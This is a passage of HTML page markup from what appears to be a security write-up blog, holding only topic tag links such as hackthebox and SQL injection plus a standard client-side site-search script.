href="/tags/hackthebox/">hackthebox</a> <a class="post-tag btn btn-outline-primary" href="/tags/linux/">linux</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/binary-exploitation/">binary exploitation</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">active directory</a> <a class="post-tag btn btn-outline-primary" href="/tags/sql-injection/">sql injection</a> <a class="post-tag btn btn-outline-primary" href="/tags/command-injection/">command injection</a> <a class="post-tag btn btn-outline-primary" href="/tags/cve/">cve</a> <a class="post-tag btn btn-outline-primary" href="/tags/pg-practice/">pg practice</a> <a class="post-tag btn btn-outline-primary" href="/tags/kernel-exploit/">kernel exploit</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
